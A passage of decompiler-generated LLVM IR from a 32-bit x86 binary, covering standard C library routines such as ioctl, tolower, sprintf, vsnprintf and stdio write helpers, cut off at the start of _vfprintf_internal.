  uselistorder i32 %v5_804dbfe, { 1, 2, 0 }
  uselistorder i32 %v0_804dbf5, { 1, 0 }
  uselistorder i8 %v2_804db7f95, { 1, 2, 0 }
  uselistorder i8* %v1_804db7f94, { 1, 0 }
  uselistorder i32 %v0_804db7f47, { 1, 0 }
  uselistorder i32 %v2_804dba5, { 1, 0 }
  uselistorder i32 %v1_804db9e, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804dba8.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_804db93, { 1, 0 }
  uselistorder i32 %v0_804db93, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_804db85, { 1, 0 }
  uselistorder i8* %v4_804dbfe, { 1, 0 }
  uselistorder i32 %v4_804dc61, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_804da22, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d9fd, { 1, 0 }
  uselistorder i32 %v1_804d9e0, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 4, 0, 3, 2 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804dc95, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804dc75, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804dc5b.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804dc11, { 1, 0 }
  uselistorder label %dec_label_pc_804dbf5, { 1, 0 }
  uselistorder label %dec_label_pc_804dbb8, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804db7f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804dba5, { 1, 0 }
  uselistorder label %dec_label_pc_804db73, { 1, 0 }
  uselistorder label %dec_label_pc_804db5c, { 1, 0 }
  uselistorder label %dec_label_pc_804db5c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804db45, { 1, 0 }
  uselistorder label %dec_label_pc_804db0a, { 1, 0 }
  uselistorder label %dec_label_pc_804da61, { 1, 0 }
  uselistorder label %dec_label_pc_804d9f1, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804dca4 = load i32, i32* @edi, align 4
  store i32 %v0_804dca4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804dcbc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804dcc4 = call i32 @ioctl(i32 %v0_804dcbc, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804dcbc, i32* @ebx, align 4
  store i32 %v3_804dcc4, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_804dcc4, -4095
  br i1 %tmp11, label %dec_label_pc_804dcdc, label %dec_label_pc_804dcd0

dec_label_pc_804dcd0:                             ; preds = %entry
  %v1_804dcd0 = call i32 @__errno_location(i32 %v0_804dcbc)
  %v0_804dcd5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804dcd5 = sub i32 0, %v0_804dcd5
  %v2_804dcd7 = inttoptr i32 %v1_804dcd0 to i32*
  store i32 %v1_804dcd5, i32* %v2_804dcd7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dcdc

dec_label_pc_804dcdc:                             ; preds = %entry, %dec_label_pc_804dcd0
  %v0_804dcdc = phi i32 [ %v3_804dcc4, %entry ], [ -1, %dec_label_pc_804dcd0 ]
  %v2_804dce1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dce1, i32* @edi, align 4
  ret i32 %v0_804dcdc

; uselistorder directives
  uselistorder i32 %v3_804dcc4, { 1, 0, 2 }
  uselistorder i32 %v0_804dcbc, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 1, 0 }
  uselistorder label %dec_label_pc_804dcdc, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_804dce8 = add i32 %arg1, 128
  %v6_804dcf3 = icmp ugt i32 %v1_804dce8, 383
  br i1 %v6_804dcf3, label %dec_label_pc_804dcfe, label %dec_label_pc_804dcf5

dec_label_pc_804dcf5:                             ; preds = %entry
  %v0_804dcf5 = load i32, i32* bitcast (i32** @global_var_80522d4.113 to i32*), align 4
  %v2_804dcfa = mul i32 %arg1, 2
  %v3_804dcfa = add i32 %v0_804dcf5, %v2_804dcfa
  %v4_804dcfa = inttoptr i32 %v3_804dcfa to i16*
  %v5_804dcfa = load i16, i16* %v4_804dcfa, align 2
  %v6_804dcfa = sext i16 %v5_804dcfa to i32
  store i32 %v6_804dcfa, i32* @edx, align 4
  br label %dec_label_pc_804dcfe

dec_label_pc_804dcfe:                             ; preds = %entry, %dec_label_pc_804dcf5
  %v0_804dcfe = phi i32 [ %arg1, %entry ], [ %v6_804dcfa, %dec_label_pc_804dcf5 ]
  ret i32 %v0_804dcfe

; uselistorder directives
  uselistorder label %dec_label_pc_804dcfe, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804dd07 = ptrtoint i32* %stack_var_12 to i32
  %v4_804dd1a = inttoptr i32 %arg1 to i8*
  %v5_804dd1a = call i32 @__GI_vsnprintf(i8* %v4_804dd1a, i32 -1, i32 %arg2, i32 %v2_804dd07)
  ret i32 %v5_804dd1a
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804dd24 = load i32, i32* @ebp, align 4
  %v0_804dd25 = load i32, i32* @edi, align 4
  %v0_804dd26 = load i32, i32* @esi, align 4
  %v0_804dd27 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd27, i32* %stack_var_-16, align 4
  %v4_804dd2b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804dd2b, i32* @esi, align 4
  %v2_804dd2f = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_804dd60 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804dd60, i32* @ebp, align 4
  %v1_804dd64 = sub i32 -1, %v4_804dd2b
  store i32 %v1_804dd64, i32* @ebx, align 4
  %v1_804dd67 = call i32 @__stdio_init_mutex(i32 %v2_804dd2f)
  %v0_804dd77 = load i32, i32* @ebx, align 4
  %v1_804dd77 = load i32, i32* @edi, align 4
  %tmp35 = icmp ugt i32 %v0_804dd77, %v1_804dd77
  br i1 %tmp35, label %dec_label_pc_804dd7b, label %dec_label_pc_804dd7d

dec_label_pc_804dd7b:                             ; preds = %entry
  store i32 %v1_804dd77, i32* @ebx, align 4
  br label %dec_label_pc_804dd7d

dec_label_pc_804dd7d:                             ; preds = %entry, %dec_label_pc_804dd7b
  %v1_804dd7d = phi i32 [ %v0_804dd77, %entry ], [ %v1_804dd77, %dec_label_pc_804dd7b ]
  %v0_804dd7d = load i32, i32* @esi, align 4
  %v2_804dd7d = add i32 %v0_804dd7d, %v1_804dd7d
  %v4_804dda8 = inttoptr i32 %arg3 to i8*
  %v5_804dda8 = call i32 @_vfprintf_internal(i32 %v2_804dd60, i8* %v4_804dda8, i32 %arg4, i32 %v2_804dd7d)
  store i32 %v5_804dda8, i32* %edx.global-to-local, align 4
  %v0_804ddb2 = load i32, i32* @ebx, align 4
  %v1_804ddb2 = icmp eq i32 %v0_804ddb2, 0
  br i1 %v1_804ddb2, label %dec_label_pc_804ddcc, label %dec_label_pc_804ddb6

dec_label_pc_804ddb6:                             ; preds = %dec_label_pc_804dd7d
  %v16_804ddba = icmp eq i32 %v1_804dd7d, 0
  %v1_804ddbe = icmp eq i1 %v16_804ddba, false
  br i1 %v1_804ddbe, label %dec_label_pc_804ddc5, label %dec_label_pc_804ddc0

dec_label_pc_804ddc0:                             ; preds = %dec_label_pc_804ddb6
  %v1_804ddc0 = add i32 %v2_804dd7d, -1
  br label %dec_label_pc_804ddc5

dec_label_pc_804ddc5:                             ; preds = %dec_label_pc_804ddb6, %dec_label_pc_804ddc0
  %stack_var_-80.0.in = phi i32 [ %v0_804dd7d, %dec_label_pc_804ddb6 ], [ %v1_804ddc0, %dec_label_pc_804ddc0 ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804ddcf.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ddcc

dec_label_pc_804ddcc:                             ; preds = %dec_label_pc_804dd7d, %dec_label_pc_804ddc5
  %v0_804ddcf = phi i32 [ %v5_804dda8, %dec_label_pc_804dd7d ], [ %v0_804ddcf.pre, %dec_label_pc_804ddc5 ]
  %v2_804ddd1 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ddd1, i32* @ebx, align 4
  store i32 %v0_804dd26, i32* @esi, align 4
  store i32 %v0_804dd25, i32* @edi, align 4
  store i32 %v0_804dd24, i32* @ebp, align 4
  ret i32 %v0_804ddcf

; uselistorder directives
  uselistorder i32 %v0_804dd7d, { 1, 0 }
  uselistorder i32 %v1_804dd7d, { 1, 0 }
  uselistorder i32 %v1_804dd77, { 1, 2, 0 }
  uselistorder i32 %v0_804dd77, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_804ddcc, { 1, 0 }
  uselistorder label %dec_label_pc_804ddc5, { 1, 0 }
  uselistorder label %dec_label_pc_804dd7d, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804ddd9 = load i32, i32* @edi, align 4
  %v0_804dddb = load i32, i32* @ebx, align 4
  %v4_804dddf = ptrtoint i16* %arg1 to i32
  store i32 %v4_804dddf, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_804ddeb4 = icmp eq i32 %arg3, 0
  br i1 %v1_804ddeb4, label %dec_label_pc_804de4a, label %dec_label_pc_804ddf0.lr.ph

dec_label_pc_804ddf0.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804ddf0

dec_label_pc_804ddf0:                             ; preds = %dec_label_pc_804de0f.dec_label_pc_804ddf0_crit_edge, %dec_label_pc_804ddf0.lr.ph
  %v0_804de00 = phi i32 [ %v4_804dddf, %dec_label_pc_804ddf0.lr.ph ], [ %v0_804de00.pre, %dec_label_pc_804de0f.dec_label_pc_804ddf0_crit_edge ]
  %v0_804ddff = phi i32 [ %arg2, %dec_label_pc_804ddf0.lr.ph ], [ %v2_804de11, %dec_label_pc_804de0f.dec_label_pc_804ddf0_crit_edge ]
  %v0_804ddf2.in = phi i32 [ %arg3, %dec_label_pc_804ddf0.lr.ph ], [ %v2_804de0f, %dec_label_pc_804de0f.dec_label_pc_804ddf0_crit_edge ]
  %v0_804ddf2 = icmp slt i32 %v0_804ddf2.in, 0
  store i32 %v0_804ddf2.in, i32* %ebp.global-to-local, align 4
  %v2_804ddf2 = icmp eq i1 %v0_804ddf2, false
  %storemerge = select i1 %v2_804ddf2, i32 %v0_804ddf2.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804de00 = add i32 %v0_804de00, 4
  %v2_804de00 = inttoptr i32 %v1_804de00 to i32*
  %v3_804de00 = load i32, i32* %v2_804de00, align 4
  %tmp36 = inttoptr i32 %v0_804ddff to i32*
  %v5_804de03 = call i32 @__libc_write(i32 %v3_804de00, i32* %tmp36, i32 %storemerge)
  store i32 %v5_804de03, i32* %eax.global-to-local, align 4
  %v2_804de0b = icmp slt i32 %v5_804de03, 0
  br i1 %v2_804de0b, label %dec_label_pc_804de15, label %dec_label_pc_804de0f

dec_label_pc_804de0f:                             ; preds = %dec_label_pc_804ddf0
  %v0_804de0f = load i32, i32* @ebx, align 4
  %v2_804de0f = sub i32 %v0_804de0f, %v5_804de03
  %v12_804de0f = icmp eq i32 %v2_804de0f, 0
  store i32 %v2_804de0f, i32* @ebx, align 4
  %v0_804de11 = load i32, i32* %esi.global-to-local, align 4
  %v2_804de11 = add i32 %v0_804de11, %v5_804de03
  store i32 %v2_804de11, i32* %esi.global-to-local, align 4
  br i1 %v12_804de0f, label %dec_label_pc_804de4a, label %dec_label_pc_804de0f.dec_label_pc_804ddf0_crit_edge

dec_label_pc_804de0f.dec_label_pc_804ddf0_crit_edge: ; preds = %dec_label_pc_804de0f
  %v0_804de00.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804ddf0

dec_label_pc_804de15:                             ; preds = %dec_label_pc_804ddf0
  %v0_804de15 = load i32, i32* @edi, align 4
  %v1_804de15 = add i32 %v0_804de15, 8
  %v2_804de15 = inttoptr i32 %v1_804de15 to i32*
  %v3_804de15 = load i32, i32* %v2_804de15, align 4
  store i32 %v3_804de15, i32* @edx, align 4
  %v1_804de18 = add i32 %v0_804de15, 12
  %v2_804de18 = inttoptr i32 %v1_804de18 to i32*
  %v3_804de18 = load i32, i32* %v2_804de18, align 4
  store i32 %v3_804de18, i32* %eax.global-to-local, align 4
  %v1_804de1b = inttoptr i32 %v0_804de15 to i16*
  %v2_804de1b = load i16, i16* %v1_804de1b, align 2
  %v3_804de1b = or i16 %v2_804de1b, 8
  store i16 %v3_804de1b, i16* %v1_804de1b, align 2
  %v0_804de1f = load i32, i32* %eax.global-to-local, align 4
  %v1_804de1f = load i32, i32* @edx, align 4
  %v2_804de1f = sub i32 %v0_804de1f, %v1_804de1f
  %v12_804de1f = icmp eq i32 %v2_804de1f, 0
  store i32 %v2_804de1f, i32* %eax.global-to-local, align 4
  %v4_804de46.pre = load i32, i32* @ebx, align 4
  br i1 %v12_804de1f, label %dec_label_pc_804de46, label %dec_label_pc_804de23

dec_label_pc_804de23:                             ; preds = %dec_label_pc_804de15
  %v6_804de25 = icmp ugt i32 %v2_804de1f, %v4_804de46.pre
  br i1 %v6_804de25, label %dec_label_pc_804de29.preheader, label %dec_label_pc_804de27

dec_label_pc_804de27:                             ; preds = %dec_label_pc_804de23
  store i32 %v2_804de1f, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804de29.preheader

dec_label_pc_804de29.preheader:                   ; preds = %dec_label_pc_804de27, %dec_label_pc_804de23
  %v0_804de29.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804de29

dec_label_pc_804de29:                             ; preds = %dec_label_pc_804de29.preheader, %dec_label_pc_804de3b
  %v2_804de2b = phi i32 [ %v1_804de1f, %dec_label_pc_804de29.preheader ], [ %v1_804de37, %dec_label_pc_804de3b ]
  %v4_804de29 = phi i32 [ %v2_804de1f, %dec_label_pc_804de29.preheader ], [ %v0_804de2d, %dec_label_pc_804de3b ]
  %v0_804de29 = phi i32 [ %v0_804de29.pre, %dec_label_pc_804de29.preheader ], [ %v1_804de3b, %dec_label_pc_804de3b ]
  %v1_804de29 = inttoptr i32 %v0_804de29 to i8*
  %v2_804de29 = load i8, i8* %v1_804de29, align 1
  %v3_804de29 = zext i8 %v2_804de29 to i32
  %v5_804de29 = and i32 %v4_804de29, -256
  %v6_804de29 = or i32 %v3_804de29, %v5_804de29
  store i32 %v6_804de29, i32* %eax.global-to-local, align 4
  %v3_804de2b = inttoptr i32 %v2_804de2b to i8*
  store i8 %v2_804de29, i8* %v3_804de2b, align 1
  %v0_804de2d = load i32, i32* %eax.global-to-local, align 4
  %v1_804de2d = trunc i32 %v0_804de2d to i8
  %v10_804de2d = icmp eq i8 %v1_804de2d, 10
  %v1_804de2f = icmp eq i1 %v10_804de2d, false
  br i1 %v1_804de2f, label %dec_label_pc_804de37, label %dec_label_pc_804de31

dec_label_pc_804de31:                             ; preds = %dec_label_pc_804de29
  %v0_804de31 = load i32, i32* @edi, align 4
  %v1_804de31 = add i32 %v0_804de31, 1
  %v2_804de31 = inttoptr i32 %v1_804de31 to i8*
  %v3_804de31 = load i8, i8* %v2_804de31, align 1
  %v4_804de31 = urem i8 %v3_804de31, 2
  %v5_804de31 = icmp eq i8 %v4_804de31, 0
  %v1_804de35 = icmp eq i1 %v5_804de31, false
  br i1 %v1_804de35, label %dec_label_pc_804de31.dec_label_pc_804de3e_crit_edge, label %dec_label_pc_804de37

dec_label_pc_804de31.dec_label_pc_804de3e_crit_edge: ; preds = %dec_label_pc_804de31
  %v0_804de3e.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804de3e

dec_label_pc_804de37:                             ; preds = %dec_label_pc_804de31, %dec_label_pc_804de29
  %v0_804de37 = load i32, i32* @edx, align 4
  %v1_804de37 = add i32 %v0_804de37, 1
  store i32 %v1_804de37, i32* @edx, align 4
  %v0_804de38 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804de38 = add i32 %v0_804de38, -1
  %v8_804de38 = icmp eq i32 %v1_804de38, 0
  store i32 %v1_804de38, i32* %ebp.global-to-local, align 4
  br i1 %v8_804de38, label %dec_label_pc_804de37.dec_label_pc_804de3e_crit_edge, label %dec_label_pc_804de3b

dec_label_pc_804de37.dec_label_pc_804de3e_crit_edge: ; preds = %dec_label_pc_804de37
  %v1_804de3e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804de3e

dec_label_pc_804de3b:                             ; preds = %dec_label_pc_804de37
  %v0_804de3b = load i32, i32* %esi.global-to-local, align 4
  %v1_804de3b = add i32 %v0_804de3b, 1
  store i32 %v1_804de3b, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804de29

dec_label_pc_804de3e:                             ; preds = %dec_label_pc_804de37.dec_label_pc_804de3e_crit_edge, %dec_label_pc_804de31.dec_label_pc_804de3e_crit_edge
  %v1_804de3e = phi i32 [ %v0_804de31, %dec_label_pc_804de31.dec_label_pc_804de3e_crit_edge ], [ %v1_804de3e.pre, %dec_label_pc_804de37.dec_label_pc_804de3e_crit_edge ]
  %v0_804de3e = phi i32 [ %v0_804de3e.pre, %dec_label_pc_804de31.dec_label_pc_804de3e_crit_edge ], [ %v1_804de37, %dec_label_pc_804de37.dec_label_pc_804de3e_crit_edge ]
  %v2_804de3e = add i32 %v1_804de3e, 16
  %v3_804de3e = inttoptr i32 %v2_804de3e to i32*
  store i32 %v0_804de3e, i32* %v3_804de3e, align 4
  %v0_804de41 = load i32, i32* @edx, align 4
  %v1_804de41 = load i32, i32* @edi, align 4
  %v2_804de41 = add i32 %v1_804de41, 8
  %v3_804de41 = inttoptr i32 %v2_804de41 to i32*
  %v4_804de41 = load i32, i32* %v3_804de41, align 4
  %v5_804de41 = sub i32 %v0_804de41, %v4_804de41
  store i32 %v5_804de41, i32* @edx, align 4
  %v0_804de44 = load i32, i32* @ebx, align 4
  %v2_804de44 = sub i32 %v0_804de44, %v5_804de41
  br label %dec_label_pc_804de46

dec_label_pc_804de46:                             ; preds = %dec_label_pc_804de15, %dec_label_pc_804de3e
  %v4_804de46 = phi i32 [ %v2_804de44, %dec_label_pc_804de3e ], [ %v4_804de46.pre, %dec_label_pc_804de15 ]
  %v5_804de46 = sub i32 %arg3, %v4_804de46
  br label %dec_label_pc_804de4a

dec_label_pc_804de4a:                             ; preds = %dec_label_pc_804de0f, %entry, %dec_label_pc_804de46
  %stack_var_12.0 = phi i32 [ %v5_804de46, %dec_label_pc_804de46 ], [ 0, %entry ], [ %arg3, %dec_label_pc_804de0f ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_804dddb, i32* @ebx, align 4
  store i32 %v0_804ddd9, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_804de3b, { 1, 0 }
  uselistorder i32 %v1_804de38, { 1, 0 }
  uselistorder i32 %v1_804de37, { 0, 2, 1 }
  uselistorder i32 %v0_804de2d, { 1, 0 }
  uselistorder i32 %v2_804de11, { 1, 0 }
  uselistorder i32 %v2_804de0f, { 1, 2, 0 }
  uselistorder i32 %v5_804de03, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_804de4a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804de46, { 1, 0 }
  uselistorder label %dec_label_pc_804de29, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804de58 = load i32, i32* @edi, align 4
  %v0_804de59 = load i32, i32* @esi, align 4
  %v0_804de5a = load i32, i32* @ebx, align 4
  %v0_804de5b = load i32, i32* @eax, align 4
  store i32 %v0_804de5b, i32* @edi, align 4
  %v0_804de60 = load i32, i32* @ecx, align 4
  store i32 %v0_804de60, i32* @esi, align 4
  store i32 %v0_804de60, i32* @ebx, align 4
  %v0_804de64 = load i32, i32* @edx, align 4
  store i32 %v0_804de64, i32* %stack_var_-13, align 4
  %v1_804de6b2 = icmp eq i32 %v0_804de60, 0
  br i1 %v1_804de6b2, label %dec_label_pc_804de83, label %dec_label_pc_804de6f.lr.ph

dec_label_pc_804de6f.lr.ph:                       ; preds = %entry
  %v2_804de6f = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804de6f

dec_label_pc_804de6a:                             ; preds = %dec_label_pc_804de6f
  %v1_804de6a = add i32 %v0_804de6a, -1
  %v8_804de6a = icmp eq i32 %v1_804de6a, 0
  store i32 %v1_804de6a, i32* @ebx, align 4
  br i1 %v8_804de6a, label %dec_label_pc_804de83.loopexit, label %dec_label_pc_804de6a.dec_label_pc_804de6f_crit_edge

dec_label_pc_804de6a.dec_label_pc_804de6f_crit_edge: ; preds = %dec_label_pc_804de6a
  %v0_804de73.pre = load i32, i32* @edx, align 4
  %v0_804de74.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804de6f

dec_label_pc_804de6f:                             ; preds = %dec_label_pc_804de6a.dec_label_pc_804de6f_crit_edge, %dec_label_pc_804de6f.lr.ph
  %v0_804de74 = phi i32 [ %v0_804de74.pre, %dec_label_pc_804de6a.dec_label_pc_804de6f_crit_edge ], [ %v0_804de5b, %dec_label_pc_804de6f.lr.ph ]
  %v0_804de73 = phi i32 [ %v0_804de73.pre, %dec_label_pc_804de6a.dec_label_pc_804de6f_crit_edge ], [ %v0_804de64, %dec_label_pc_804de6f.lr.ph ]
  %v4_804de78 = call i32 @__stdio_fwrite(i32 %v2_804de6f, i32 1, i32 %v0_804de74, i32 %v0_804de73)
  %v8_804de80 = icmp eq i32 %v4_804de78, 1
  %v0_804de6a = load i32, i32* @ebx, align 4
  br i1 %v8_804de80, label %dec_label_pc_804de6a, label %dec_label_pc_804de83.loopexit

dec_label_pc_804de83.loopexit:                    ; preds = %dec_label_pc_804de6a, %dec_label_pc_804de6f
  %v1_804de83.ph = phi i32 [ %v0_804de6a, %dec_label_pc_804de6f ], [ 0, %dec_label_pc_804de6a ]
  %v0_804de83.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804de83

dec_label_pc_804de83:                             ; preds = %dec_label_pc_804de83.loopexit, %entry
  %v0_804de83 = phi i32 [ 0, %entry ], [ %v0_804de83.pre, %dec_label_pc_804de83.loopexit ]
  %v1_804de83 = phi i32 [ 0, %entry ], [ %v1_804de83.ph, %dec_label_pc_804de83.loopexit ]
  %v2_804de83 = sub i32 %v0_804de83, %v1_804de83
  store i32 %v0_804de5a, i32* @ebx, align 4
  store i32 %v0_804de59, i32* @esi, align 4
  store i32 %v0_804de58, i32* @edi, align 4
  ret i32 %v2_804de83

; uselistorder directives
  uselistorder i32 %v1_804de6a, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804de83.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804dea1 = trunc i32 %arg2 to i8
  %v5_804dea1 = icmp slt i8 %v3_804dea1, 0
  %v1_804dea3 = icmp eq i1 %v5_804dea1, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804dea3, label %dec_label_pc_804ded4, label %dec_label_pc_804dea5

dec_label_pc_804dea5:                             ; preds = %entry
  %v3_804deac = call i32 @strlen(i8* %arg4)
  %v0_804deb4 = load i32, i32* @ebx, align 4
  %v2_804deb4 = sub i32 %v0_804deb4, %v3_804deac
  store i32 %v2_804deb4, i32* @ebx, align 4
  store i32 %v3_804deac, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804deb4, 1
  br i1 %tmp23, label %dec_label_pc_804ded2, label %dec_label_pc_804debc

dec_label_pc_804debc:                             ; preds = %dec_label_pc_804dea5
  %v0_804debc = load i32, i32* @edi, align 4
  %v1_804debc = urem i32 %v0_804debc, 128
  store i32 %v1_804debc, i32* @edi, align 4
  store i32 %v2_804deb4, i32* @ecx, align 4
  store i32 %v1_804debc, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_804dec7 = call i32 @_charpad()
  store i32 %v0_804dec7, i32* @ebp, align 4
  %v12_804dece = icmp eq i32 %v0_804dec7, %v2_804deb4
  %v1_804ded0 = icmp eq i1 %v12_804dece, false
  br i1 %v1_804ded0, label %dec_label_pc_804deee, label %dec_label_pc_804debc.dec_label_pc_804ded2_crit_edge

dec_label_pc_804debc.dec_label_pc_804ded2_crit_edge: ; preds = %dec_label_pc_804debc
  %v0_804ded2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ded2

dec_label_pc_804ded2:                             ; preds = %dec_label_pc_804debc.dec_label_pc_804ded2_crit_edge, %dec_label_pc_804dea5
  %v0_804ded2 = phi i32 [ %v0_804ded2.pre, %dec_label_pc_804debc.dec_label_pc_804ded2_crit_edge ], [ %v3_804deac, %dec_label_pc_804dea5 ]
  store i32 %v0_804ded2, i32* @ebx, align 4
  br label %dec_label_pc_804ded4

dec_label_pc_804ded4:                             ; preds = %entry, %dec_label_pc_804ded2
  %v0_804dedf = phi i32 [ %arg3, %entry ], [ %v0_804ded2, %dec_label_pc_804ded2 ]
  %tmp24 = icmp slt i32 %v0_804dedf, 1
  br i1 %tmp24, label %dec_label_pc_804deec, label %dec_label_pc_804deda

dec_label_pc_804deda:                             ; preds = %dec_label_pc_804ded4
  %v0_804deda = load i32, i32* @ecx, align 4
  %v5_804dee4 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804dedf, i32 %arg1, i32 %v0_804deda)
  br label %dec_label_pc_804deec

dec_label_pc_804deec:                             ; preds = %dec_label_pc_804ded4, %dec_label_pc_804deda
  %v1_804deec = phi i32 [ 0, %dec_label_pc_804ded4 ], [ %v5_804dee4, %dec_label_pc_804deda ]
  %v0_804deec = load i32, i32* @ebp, align 4
  %v2_804deec = add i32 %v0_804deec, %v1_804deec
  br label %dec_label_pc_804deee

dec_label_pc_804deee:                             ; preds = %dec_label_pc_804debc, %dec_label_pc_804deec
  %v0_804def1 = phi i32 [ %v0_804dec7, %dec_label_pc_804debc ], [ %v2_804deec, %dec_label_pc_804deec ]
  ret i32 %v0_804def1

; uselistorder directives
  uselistorder i32 %v0_804dedf, { 1, 0 }
  uselistorder i32 %v0_804dec7, { 1, 0, 2 }
  uselistorder i32 %v1_804debc, { 1, 0 }
  uselistorder i32 %v2_804deb4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804deee, { 1, 0 }
  uselistorder label %dec_label_pc_804deec, { 1, 0 }
  uselistorder label %dec_label_pc_804ded4, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
